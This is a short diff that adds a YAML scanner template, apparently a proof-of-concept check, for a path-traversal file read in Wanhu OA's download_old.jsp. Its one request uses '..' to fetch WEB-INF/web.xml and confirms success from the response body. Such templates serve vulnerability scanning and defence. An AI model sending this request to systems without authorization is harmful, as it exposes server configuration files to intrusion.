@@ -1,0 +1,8 @@
+name: wanhu-oa-download-old-file-read
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
+    expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>') 
+expression: r0()
